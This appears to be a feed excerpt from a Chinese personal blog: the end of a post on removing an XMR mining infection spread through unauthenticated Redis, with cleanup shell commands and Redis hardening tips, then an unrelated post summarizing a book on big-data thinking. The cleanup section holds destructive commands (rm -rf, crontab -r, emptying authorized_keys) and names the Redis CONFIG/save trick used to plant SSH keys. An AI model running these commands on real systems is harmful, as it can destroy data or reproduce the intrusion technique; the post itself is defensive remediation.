&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#29702;&amp;#23450;&amp;#26102;&amp;#20219;&amp;#21153;&lt;/span&gt;
crontab -r
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#38500;redis key Back1 Back3 Back3&lt;/span&gt;
redis-cli -h xxx.xxx.xxx.xxx -x del Back1
redis-cli -h xxx.xxx.xxx.xxx -x del Back2
redis-cli -h xxx.xxx.xxx.xxx -x del Back3
redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dbfilename dump.rdb
redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dir /tmp
redis-cli -h xxx.xxx.xxx.xxx -x save
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#29702;&amp;#36816;&amp;#34892;&amp;#33050;&amp;#26412;&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #AE81FF; font-weight: bold;&quot;&gt;`ps -ef|grep shz.sh|grep -v grep|awk '{print $2}'`&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #AE81FF; font-weight: bold;&quot;&gt;`ps -ef|grep zigw|grep -v grep|awk '{print $2}'`&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #AE81FF; font-weight: bold;&quot;&gt;`ps -ef|grep cmd|grep -v grep|awk '{print $2}'`&lt;/span&gt;
chattr -i /etc/zigw
chattr -i /etc/shz.sh
chattr -i /tmp/zigw
chattr -i /tmp/shz.sh
rm -rf /etc/shz.sh
rm -rf /etc/gmbpr2
rm -rf /etc/zigw
rm -rf /tmp/zigw
rm -rf /tmp/shz.sh
rm -rf ~/.cmd

&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#29702;SSH&amp;#20813;&amp;#30331;&amp;#24405;&amp;#20449;&amp;#24687;&lt;/span&gt;
cat /dev/null&amp;gt; ~/.ssh/authorized_keys
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#29702;js&amp;#33050;&amp;#26412;&lt;/span&gt;
find / -name &lt;span style=&quot;color: #E6DB74;&quot;&gt;'*.js'&lt;/span&gt;|xargs grep -L f4ce9|xargs sed -i &lt;span style=&quot;color: #E6DB74;&quot;&gt;'$d'&lt;/span&gt;
mv /usr/bin/get /usr/bin/wget
mv /usr/bin/url /usr/bin/curl
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org504c501&quot;&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #F92672;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;By xzeu&lt;/span&gt;
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;http://www.xzeu.com&lt;/span&gt;
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;Email: admin#xzeu.com&lt;/span&gt;
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;Filename: clearlink.sh&lt;/span&gt;

&lt;span style=&quot;color: #75715E;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;Begin&lt;/span&gt;
find / -type f -name &lt;span style=&quot;color: #E6DB74;&quot;&gt;'*.js'&lt;/span&gt; |xargs fgrep -s -l &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;e02cf4ce91284dab9bc3fc4cc2a65e28&quot;&lt;/span&gt;|xargs ls -l |awk &lt;span style=&quot;color: #E6DB74;&quot;&gt;'{print $9}'&lt;/span&gt;&amp;gt;jsfile.txt
&lt;span style=&quot;color: #F92672;&quot;&gt;for&lt;/span&gt; file&lt;span style=&quot;color: #F92672;&quot;&gt; in&lt;/span&gt; &lt;span style=&quot;color: #AE81FF; font-weight: bold;&quot;&gt;`cat ~/jsfile.txt`&lt;/span&gt;;
&lt;span style=&quot;color: #F92672;&quot;&gt;do&lt;/span&gt;
  &lt;span style=&quot;color: #F92672;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #FD971F;&quot;&gt;file&lt;/span&gt;
  &lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;sed -i '/e02cf4ce91284dab9bc3fc4cc2a65e28/d' $file&lt;/span&gt;
  &lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;cp $file ${file}.bad&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;done&lt;/span&gt;

&lt;span style=&quot;color: #F92672;&quot;&gt;exit&lt;/span&gt; 0
&lt;span style=&quot;color: #75715E;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;END&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 恢复服务器中的js文件(其中grep的参数为小写的L)
方法一：删除站点所有感染 js 文件，从代码仓库pull，重新上传部署。
方法二：# find / -name '*.js' | xargs grep -l f4ce9 | xargs sed -i '/f4ce9/d'

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org765b1fe&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org765b1fe&quot;&gt;预防&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org765b1fe&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 限制内网访问，或者只限制本机访问
只监听内网的IP，然后在iptables里面限制访问的主机：在/etc/redis/redis.conf中配置如下：
bind 192.168.1.100
如果服务只需要本机访问就直接监听127.0.0.1的回环地址就可以了。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 设置防火墙
如果需要其他机器访问，或者设置了slave模式，那就记得加上相应的防火墙设置，命令如下：
iptables -A INPUT -s 192.168.1.100/32 -p tcp --dport 6379 -j ACCEPT

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
3. 禁止root用户启动redis
使用root权限去运行网络服务是比较有风险的（nginx和apache都是有独立的work用户，而redis没有）。
edis crackit 漏洞就是利用root用户的权限来替换或者增加authorized_keys，来获取root登录权限的。
使用root切换到redis用户启动服务:
useradd -s /sbin/nolog -M redissetsid sudo -u redis /usr/bin/redis-server /etc/redis/redis.conf

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
4. 限制redis文件目录访问权限
设置redis的主目录权限为700,如果redis配置文件独立于redis主目录,权限修过为600,因为redis密码明文存储在配置文件中。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
5. 避免使用熟知的端口,降低被初级扫描的风险
在/etc/redis/redis.conf中配置如下：
找到port 6379这行，把6379改为9999，记得iptables对应的端口要修改

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
6. 开启redis密码认证,并设置高复杂度密码
redis在redis.conf配置文件中，设置配置项requirepass， 开户密码认证。
redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。 

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
7. 禁用或者重命名危险命令
edis crackit漏洞就利用config/save两个命令完成攻击 。 因redis无用户权限限制，建议危险的命令，
使用rename配置项进行禁用或重命名，这样外部不了解重命名规则攻击者，就不能执行这类命令。涉及到的命令：
FLUSHDB, FLUSHALL, KEYS, PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME, DEBUG, EVAL`
以下示例：redis.config文件禁用FLUSHDB、FLUSHALL两个命令；重命名CONFIG、SHUTDOWN命令，添加一个特殊的后缀。
这样redis启动后，只能运行CONFIG_b9fc8327c4dee7命令，不能执行CONFIG命令。
rename-command CONFIG CONFIG_des327c4dee7dfsf
rename-command SHUTDOWN SHUTDOWN_des327c4dee7dfsf
rename-command FLUSHDB &quot;&quot;
rename-command FLUSHALL &quot;&quot;
上述配置将config，flushdb，flushall设置为了空，即禁用该命令，我们也可以命名为一些攻击者难以猜测，
我们自己却容易记住的的名字。保存之后，执行/etc/init.d/redis-server restart 重启生效。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org51c271a&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org51c271a&quot;&gt;参考&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org51c271a&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/Rebybyx/p/9913779.html&quot;&gt;XMR恶意挖矿脚本处理笔记&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/186743.html&quot;&gt;XMR恶意挖矿案例简析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.xzeu.com/index.php/archives/120/&quot;&gt;Redis未授权访问缺陷,服务器变矿机&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="比特币" /><category term="恶意挖矿" /><category term="病毒" /><category term="Bitcoin" /><category term="Mining" /><category term="Virus" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">《致胜大数据时代的50种思维方法》</title><link href="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data/" rel="alternate" type="text/html" title="《致胜大数据时代的50种思维方法》" /><published>2018-09-02T00:00:00+08:00</published><updated>2018-09-02T00:00:00+08:00</updated><id>http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data</id><content type="html" xml:base="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data/">&lt;p&gt;
致胜大数据时代的50种思维方法
&lt;/p&gt;

&lt;div class=&quot;org-center&quot;&gt;
&lt;p&gt;
If you have questions, please send email to zrg1390556487@gmail.com.
&lt;/p&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-org3734ab5&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org3734ab5&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 前言&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org329e3ea&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org329e3ea&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 什么是大数据&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;最早提出“大数据”时代来临的是全球知名的咨询公司麦肯锡。“数据已经渗透到每一个行业和业务领域，成为重要的组成部分之一。人们对于海量数据的挖掘和运用，预示着新一波生产率增长和消费者盈余浪潮的到来。”&lt;/li&gt;
&lt;li&gt;2008年9月，《自然》杂志推出了封面专栏——“大数据”，内容讲述了数据在生物、物理、工程、数学及社会经济等多方面学科所占据的位置和角色的重要性。&lt;/li&gt;
&lt;li&gt;哈佛大学-社会学教授-加里·金说：“这是一场革命，庞大的数据资源使得各个领域开始了量化进程。无论学术界、商界还是政府，所有领域都将开始这种进程。”&lt;/li&gt;
&lt;li&gt;“大数据”，英文为&quot;Big Dat，，&quot;简单来说，“大数据”是一种巨量资料库，可以在合理时间内达到撷取、管理、处理并整理为帮助公司、企业经营和决策的资讯信息。&lt;/li&gt;
&lt;li&gt;业界将“大数据”概括成四个V，即大量化(Volume)、多样化(Variety)、快速化(Velocity)和价值化(Value)。&lt;/li&gt;
&lt;li&gt;大数据的信息量有多大？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;截止到2012年，数据量已经从TB级别跃升到PB、EB乃至ZB级别。（1024GB=1TB，1024TB=1PB，102**B=1EB，1024EB=1ZB）。&lt;/li&gt;
&lt;li&gt;2008年，全球产生的数据量为0.49ZB；2009年的数据量为0.8ZB；2010年的数据量为1.2ZB；2011年的数据量更是持续增长，竟高达1.82ZB。这个数据量，相当于全世界的每个人产生200GB以上的数据。&lt;/li&gt;
&lt;li&gt;IBM公司称，截止到2013年10月，全世界所获得的数据中，有90%都是过去两年内产生的。预计到2020年时，全世界所产生的数据规模将达到今天的44倍。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;“大数据”不仅是量大而已，它还具有多样化、快速化、价值化等优势。&lt;/li&gt;
&lt;li&gt;截止到2012年10月，大数据所形成的市场规模在51亿美元左右。到了2017年，此数据预计会上涨到530亿美元。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgadccbc9&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgadccbc9&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 改变思维模式，用数据说话&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;来举一个简单的例子：苹果公司创始人史蒂夫·乔布斯在罹患癌症后，不惜花费巨额抽取了全身的DNA信息。这样一来，医生就可以根据他全身的DNA信息来判断癌细胞的变化，从而对症下药。然而，对于普通的患者来说，是拿不出巨额钱款来做这种抽取检测的。换句话说，医生只能从普通患者身上提取很小的一部分DNA信息。两者的治疗效果有多大差异，可想而知。&lt;/li&gt;
&lt;li&gt;再来举个简单的例子：如果你上淘宝，登录支付宝账户，点开电子对账单，你是不是能够看到自己一年的消费曲线图？是不是能够看到每个月的支出和收入？是不是能够看到自己的钱花到哪里去了？是不是比拿笔记账清晰和准确得多？根据网络购物的数据中，你还会发现：哪个城市的男人比女人购买的东西还要多；哪个城市的人用支付宝缴纳水电费的频率最高；什么星座的男性或女性在某年的消费额最高；在一年里，在父母或亲友身上花费了多少；节假日时，什么东西最畅销……&lt;/li&gt;
&lt;li&gt;大数据专家维克托·迈尔-舍恩伯格在《大数据时代》中是这样解释的：云计算在获取海量数据的同时，也带来了数据的混杂性，这会给传统的数据分析带来一些困扰。在以往，我们习惯于由数据得出具体结果。而在大数据时代，我们应当关注的是数据之间的相关关系，而不是数据之间的因果关系。&lt;/li&gt;
&lt;li&gt;数据之间的相关关系可以帮助我们捕捉现在的线索和预测未来。如A和B的情况经常一起发生，那么只要注意到B情况发生，就能预测A的情况是怎么样的。这种“A和B”的关系在零售行业和IT行业中已被广泛运用。7-11便利店通过分析零售终端的数据，得出了这样的一个相关关系—温度低于15摄氏度，暖宝宝的销售量便增加5%。于是，只要温度低于这一度数，7-11便利店内的暖宝宝就会上架；豆瓣电台会推荐一些你可能会喜欢的音乐；当你在当当网买某本书后，系统就会提醒你—购买这本书的人中，有30%也购买了另外一本书……&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org874ac9f&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org874ac9f&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 大数据是一场革命&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge501577&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge501577&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 定律思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;此前，在大数据中，有两个较为突出的定律：一秒定律或秒级定律和摩尔定律。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;什么叫一秒定律或秒级定律？指的是对处理速度有要求，一般要在秒级时间给出准确的分析结果。&lt;/li&gt;
&lt;li&gt;什么叫摩尔定律？ 指的是简单地评估出半导体技术进展的经验法则，其重要的意义是对于长期来说的，IC制程技术是以一直线的方式向前推展，使得IC产品能持续降低成本，增加功能和提升性能。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据时代，人们更要重视统计学。为什么要强调统计学呢？那是因为人们在认知能力中，统计思维算是最差劲的。要知道，人的大脑中有一些功能比较优良，甚至超过人们自身的想象，比如人们的语言能力。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;举个例子：当一个人在深夜行走时，会敏锐地察觉到周边的变化。一旦感受到危险或不安的情绪时，就会立即逃跑，甚至大喊大叫。而与此同时，人的大脑之中还有另外一套操作系统，是用来做逻辑推理以及进行统计分析的，只是这个系统不怎么完善。于是，人们天生就缺乏逻辑推理能力和统计思维能力。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;为什么大数据变成了一个最热门的词汇？主要的原因有两个。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个原因是，由于IT革命后，人们有了处理数据的多方面能力，有对计算机数据的处理能力、对计算机的存储能力以及对计算机的计算的能力，等等。再加上，人类储存信息量的增长速度要比世界经济增长的速度快四倍（这仅仅是在金融危机爆发之前的世界经济增长的速度）。而计算机数据处理能力的增长速度，要比世界经济增长的速度快九倍。&lt;/li&gt;
&lt;li&gt;第二个原因是，社会上的一切现象以及企业的发展，能够被数据化的东西越来越多。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;社科院世界经济与政治研究所副所长何帆总结出了大数据的三个规律：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个规律是知其然而不必知其所以然，外行打败内行；&lt;/li&gt;
&lt;li&gt;第二个规律是彻底的价格歧视，商家比你更了解你自己；&lt;/li&gt;
&lt;li&gt;第三个规律是打破专家的信息优势，病人给医生解惑。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org6e4cc15&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org6e4cc15&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 集合思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;如果把毫不相干或紧密相连的数据组合到一个集合中，就能更有效地处理这些相关的数据。这些数据可以清晰地告诉我们：每一个客户的消费观念、倾向、爱好、需求等，哪些可以归为一类，哪些可以归为另一类。&lt;/li&gt;
&lt;li&gt;大数据的集合是数据数量上的增加，能够实现从量变到质变的过程。&lt;/li&gt;
&lt;li&gt;大数据的基本结构还分为三个层次，反映出观察数据库的不同角度。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一层是物理数据层：是数据库最里面的一层，是物理存贮设备上实际存储的数据的集合。这些数据是最原始数据，也是供用户加工的对象。物理数据层由内部模式描述的指令操作处理的位串、字符和字组合而成。&lt;/li&gt;
&lt;li&gt;第二层是概念数据层：是数据库置于中间的一层，也是数据库的整体逻辑的部分。这层数据层指出了数据与数据之间的逻辑定义和联系，是存贮资料的整合点。此时要注意的是，这层数据层所涉及的是数据库所有对象的逻辑关系，而不是其物理情况。&lt;/li&gt;
&lt;li&gt;第三层是逻辑数据层：是体验用户能够看到和使用的数据库，也是能够证明用户使用过的证明和踪迹。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;总之，小数据，大集合就是按照某种数据集中起来并存放二级存储器中的一种方式。这种数据集合还有着一定的特点，比如尽量不出现重复的情况。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org17430c8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org17430c8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; 创新思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;首先，大数据的创新思维可以推动并实现巨大的经济效益。&lt;/li&gt;
&lt;li&gt;其次，大数据的创新思维可以增强社会管理水平。&lt;/li&gt;
&lt;li&gt;最后，大数据所具备的创新思维还可以推动和提高安全保障能力。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2cac017&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2cac017&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.4&lt;/span&gt; 转型思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-4&quot;&gt;
&lt;p&gt;
以广东省地税系统为例子，从几大方面来揭示大数据推动公共管理从传统向现代转型的趋势。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面就是：从粗放化向精细化转型。通过建立省级数据应用大集中征管信息系统，广东地税摆脱了以往人工操作的粗放型管理模式，真正实现了税款自动入库、自动划解和实时监控，实现了税款的稳定增长以及快速增长。再通过对海量信息的详细分析和研究，广东省对每一个商家或是企业都实现了精细化转型。比如说，在房地产方面，由于建筑行业的人员流动性大，操作的环节复杂，且没有规范性，就形成了一个比较难管的问题。但自从有了这个征管系统以后，大数据就能够实时获取房地产开发项目明细信息，其中包括土地使用权信息、房产销售进度、销售明细建筑工程进度以及各阶段的税款缴纳情况等，实现了项目从产生到消亡的全过程监控。&lt;/li&gt;
&lt;li&gt;第二个方面就是：从单兵作战型向协作共享型转型。在以往，不同政府部门拥有着不同的信息系统，但很多数据由于相互独立，所以彼此之间没有共享的信息，这些信息单独拿出去，就没有了任何用处。而大数据应用的出现，就扫除了这个盲点，使其实现了数据信息的共享，从而最大限度地发挥了数据的功效。如今，工商、税务等系统每天都会进行信息实时交换，推动了地税机关在办证服务上的创新，从原来的限时办证，实现了目前的即时办证；从原来填写一百多项登记信息，实现了目前只填写八项必要信息内容，甚至实现了享受免填服务。不仅如此，广东省地税借助大数据平台，积极推进第三方涉税信息共享，还明确了二十多个部门共享信息，真正做到了为每个部门提供便利，为社会经济的发展也提供了更快捷、更便利的服务。&lt;/li&gt;
&lt;li&gt;第三个方面就是：从柜台式向自助式全天候转型。根据纳税人的不同类别、涉税业务的不同、办理时段不同等信息，广东地税借助大数据平台，形成了自助式全天候的一种转型。比如，增添了很多服务格局—网上办税、纳税热线、服务大厅、短信服务、自助办税等多种渠道并存的大服务格局。通过自助办税终端系统，为纳税人节时省力，不仅不受地方区域的限制，也可以不受时间的限制，自行完成代开小额发票、打印缴款凭证、清缴税费、申报缴纳车船税等业务。&lt;/li&gt;
&lt;li&gt;第四个方面就是：从被动响应型向主动预见型转型。为了能够更好地服务纳税人，广东省地税通过税收大数据平台，还推出了一项特别的服务，那就是全省集中统一的短信服务。这项服务会为六百多万的纳税人提供短信订阅服务，有针对性地对目标群体提供了多项短信服务，如逾期未申报短信提醒、未到期未申报短信提醒，还有发票开具短信提醒等。借助于大数据平台，广东省地税实现了对受众精确式的短信服务，避免了轰炸式、盲目性的短信服务，从而提升了服务质量。据统计称：截止到2011年，短信服务量超过1800万条；到了2012年，短信服务量已经超过5000万条。&lt;/li&gt;
&lt;li&gt;第五个方面就是：从纸质文书向电子政务转型。现如今，广东省地税互联网电子税务局已基本建成，纳税人只需要短短的五分钟，就能轻松办税，而且还实现了网上缴纳，足不出户。此外，广东省还率先推行网络开具发票，一方面为纳税人提供了方便，节省了时间。一方面使税务机关能在第一时间掌握每张发票的信息，与企业纳税申报数据比对分析，及时总结出没有缴纳、少缴纳的税款情况。这一行动推广以后，还意外地打击了假发票泛滥的情况，也避免了一些人用假发票报销的现象。也因此，这一措施被国家税务总局誉为“税收管理史上的颠覆性举措”。&lt;/li&gt;
&lt;li&gt;第六个方面就是：从风险隐蔽型向风险防范型转型。依托大数据平台，广东省地税建立了惩防体系信息管理系统，对地税干部的税收执法和行政管理实行了全程分析和监控，有效监督和杜绝了一些知法犯法和影响国家荣誉的风险出现。监控预警信息从最初每月收到近7000个，到2012年每月收到不足500个，下降了92%。可以说，自从大数据监控平台出现后，全系统违法违纪发案率大幅度降低，不足5‰，也没有什么重大的违纪案件出现，这就是最大的成功！&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7cc1ee8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org7cc1ee8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.5&lt;/span&gt; 战略思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;未来，大数据相关的技术和能力将成为一个国家至关重要的核心战略资源。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;2012年3月，美国总统***政府宣布推出一项发展计划——“大数据的研究和发展计划”。&lt;/li&gt;
&lt;li&gt;2013年2月，法国政府发布了一项关于《数字化路线图》的技术措施，列出了五项将会大力支持的战略性高新技术，“大数据”位列其中。在这项措施中，法国政府将以软件制造商、工程师、新兴企业、信息系统设计师等为目标，开展一系列投资计划，旨在通过创新型和科学性的解决方案，将大数据运用到实际生活中。&lt;/li&gt;
&lt;li&gt;2012年9月，日本总务省也发布了一项行动计划，提出“通过大数据和开放数据开创新市场”，以复苏日本为目的推进“活跃在ICT领域的日本”ICT综合战。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据的价值主要体现在三个方面。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面，是能够实现巨大的商业价值。&lt;/li&gt;
&lt;li&gt;第二个方面是能够增强社会管理水平。&lt;/li&gt;
&lt;li&gt;第三个方面是能够提高安全保障能力。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcc98aa2&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgcc98aa2&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 应对传统模式的大数据思维&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0e93f48&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org0e93f48&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; 扩散思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;为了更好地分析大数据之间的关联性和扩散性，Facebook使用了HBase。HBase是Apache（世界使用排名第一的Web服务器软件）的另外一款产品，使用了独特定义的一组表格。HBase可以像Hadoop（一个分布式系统基础架构，由Apache基金会所开发）一样执行大数据处理产品的能力，以更迅速、更精细的方式来分析数据之间的连接。&lt;/li&gt;
&lt;li&gt;以北京的交通为例子。北京有一个交通智能化分析平台，其数据通过分析源自路网摄像头、传感器、轨道交通、旅游、地面公交、出租车、客运等行业方方面面的数据，得出了这样的一个结果：高速ETC数据每天50万条；4万辆的浮动车每天会产生近2000万条记录；出租车运营为数据为每天100万条；交通卡刷卡的记录为每天1900万条；手机定位数据为每天1800万条……此外，还计算出了北京的人均上班平均用时为52分钟，全国平均人均上班用时39分钟。这些海量的数据，在体量和产生速度上都对存储和处理能力提出了非常高的要求。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org176085e&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org176085e&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; 颠覆思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;在大数据时代，创新和转变思维就意味着进步，意味着发展。而传统的、守旧的思维已经不适用于这个时代。因此，转变思维是大数据时代的必然趋势。
&lt;ul class=&quot;org-ul&quot;&gt;
